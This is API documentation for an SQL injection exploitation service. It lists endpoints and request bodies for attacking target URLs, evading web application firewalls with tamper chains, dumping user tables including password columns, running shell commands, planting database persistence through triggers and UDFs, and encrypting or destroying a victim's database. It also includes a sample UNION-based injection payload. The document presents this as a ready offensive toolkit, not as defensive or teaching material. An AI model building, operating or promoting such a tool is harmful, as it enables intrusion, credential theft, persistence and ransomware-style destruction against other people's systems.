# SQLI API Documentation

## Overview
REST API for SQLI-HAILAMDEV exploitation pipeline

## Base URL
```
http://localhost:8081/api/v1
```

## Endpoints

### Sessions
```
POST /sessions
GET /sessions/{id}
GET /sessions
DELETE /sessions/{id}
```

### Exploitation
```
POST /exploit
{
  "url": "https://target.com/page.php?id=1",
  "method": "GET",
  "auto": true,
  "full_pipeline": true,
  "destruct_mode": "none",
  "tamper_chain": ["randomcase", "comments"],
  "threads": 10
}
```

### Detection
```
POST /detect
{
  "url": "https://target.com/page.php?id=1",
  "method": "GET"
}
```

### Data Exfiltration
```
POST /dump
{
  "session_id": "uuid",
  "database": "target_db",
  "table": "users",
  "columns": ["id", "username", "password"],
  "where": "id > 100",
  "limit": 1000,
  "format": "json"
}
```

### Shell
```
POST /shell
{
  "session_id": "uuid",
  "command": "whoami",
  "interactive": false,
  "type": "oneshot"
}
```

### Persistence
```
POST /persist
{
  "session_id": "uuid",
  "methods": ["trigger", "event", "udf_autoload"]
}
```

### Destruction
```
POST /destruct
{
  "session_id": "uuid",
  "mode": "encrypt",
  "database": "target_db",
  "table": "",
  "confirm": true,
  "encrypt_key": "base64key"
}
```

### Tamper
```
POST /tamper/test
{
  "payload": "' UNION SELECT 1,2,3--",
  "chain": "cloudflare",
  "script": ""
}
```

### Signatures
```
GET /signatures/payloads
GET /signatures/udf
```

## WebSocket
```
WS /ws/sessions/{id}
```
Real-time exploitation updates.

## Response Format
```json
{
  "session": {...},
  "detection": {...},
  "exfiltration": {...},
  "shell": {...},
  "persistence": {...},
  "destruction": {...},
  "errors": []
}
```